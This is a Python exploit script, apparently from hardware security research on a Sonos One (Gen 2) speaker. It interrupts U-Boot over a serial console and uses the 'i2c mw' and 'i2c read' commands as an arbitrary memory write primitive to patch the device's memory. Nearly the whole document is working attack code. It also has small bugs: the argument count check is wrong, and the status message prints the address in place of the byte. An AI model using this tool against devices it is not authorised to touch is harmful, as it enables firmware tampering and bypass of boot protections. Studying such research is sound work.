'''
This write-what-where script allows for writing to arbitrary memory locations
on a Sonos One (Generation 2) [S18] device, though it may be compatible with
others.

### NOTE ###

Addresses will be automatically shifted to the `relocaddr` if provided with a
memory address which is less than the defined `relocaddr`. This allows for
translation between the addresses from a disassembler and as loaded in memory
on the unit just to speed things up. However, this may differ from product to
product, so may need adjustment.

Author: Peter Adkins (@Darkarnium)
'''

import sys
import serial
import datetime

PROMPT = 'sonos tupelo >'


def unit_to_uboot():
    '''
    Attempt to use a serial console to bring the Unit into a clean U-Boot
    prompt at power on, or reset and re-enter U-Boot if already at a U-Boot
    prompt.
    '''
    with serial.Serial('/dev/ttyUSB0', 115200, timeout=10) as interface:
        # First up, reset the unit to get into a clean state.
        print('[+] Attempting to issue reset command to U-Boot')
        interface.write(b'reset\n')

        # Drop back into U-Boot.
        print('[-] Waiting for U-Boot boot interrupt prompt')
        buffer = bytes()
        while True:
            buffer += interface.readline()

            try:
                line = str(buffer, 'utf-8')
            except UnicodeDecodeError as err:
                buffer = bytes()
                continue

            # The whitelist check is just prior to the U-Boot interupt prompt.
            # When this line is encountered start reading N bytes rather than
            # until EoL - as the count down does not print an \n character
            # until AFTER the timeout.
            if line.lower().startswith('whitelist check completed'):
                # Check whether the 'Hit any key' prompt follows.
                try:
                    peek = interface.read(12)
                    if str(peek, 'utf-8').lower().startswith('hit any key'):
                        print('[+] Writing U-Boot interrupt to console')
                        interface.write(b'A')
                        buffer = bytes()
                        continue
                    else:
                        buffer += peek
                except:
                    # No point in tracking the read bytes if they'll just be
                    # discarded at the top of the next iteration.
                    pass

            # Drop out of the loop when we see the U-Boot prompt
            if line.lower().startswith(PROMPT):
                print('[-] Unit is now at U-Boot prompt')
                buffer = bytes()
                break

            # Dump the buffer contents if no matches.
            buffer = bytes()


def write_to_memory(value, addr, device=0x30, register=0x70):
    '''
    Attempt to write the given value (byte) into memory at the given address.

    Args:
        value (int): The value to write.
        addr (int): The address in memory to write to.
        device (int): The address of the device on the i2c bus to read from
        register (int): The address of the register to use as a buffer

    Return:
        Whether the read operation was successful (bool).
    '''
    with serial.Serial('/dev/ttyUSB0', 115200, timeout=5) as interface:
        command = 'i2c mw 0x{0:0x} 0x{1:0x} 0x{2:0x}\n'.format(
            device,
            register,
            value
        )
        interface.write(bytes(command, 'utf-8'))

        # Loop back is enabled, so throw away the first line.
        interface.readline()
        status = str(interface.read(len(PROMPT)), 'utf-8')

        # Abort if the write failed.
        if not status.lower().startswith(PROMPT):
            print('[!] Write failed: {0}'.format(status))
            return False

        # Attempt to read from the register into memory.
        command = 'i2c read 0x{0:0x} 0x{1:0x} 0x01 0x{2:0x}\n'.format(
            device,
            register,
            addr
        )
        interface.write(bytes(command, 'utf-8'))

        # Loop back is enabled, so throw away the first line.
        interface.readline()
        status = str(interface.read(len(PROMPT)), 'utf-8')

        # Abort if the write failed.
        if not status.lower().startswith(PROMPT):
            print('[!] Write failed: {0}'.format(status))
            return False

        return True


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: write-what-where.py <address> <byte>')
        sys.exit(-1)

    # Attempt to dump memory.
    load = 0x01000000
    base = 0x3ff21000
    addr = int(sys.argv[1], 16)
    byte = int(sys.argv[2], 16)

    # Fix the base addresses, if required.
    if addr < base:
        print('[-] Fixing base address for 0x{0:0x}'.format(addr))
        addr = base + (addr - load)

    # Reset to a clean state first.
    unit_to_uboot()
    print('[+] Patching 0x{0:0x} with byte 0x{0:0x}'.format(addr, byte))
    write_to_memory(byte, addr)
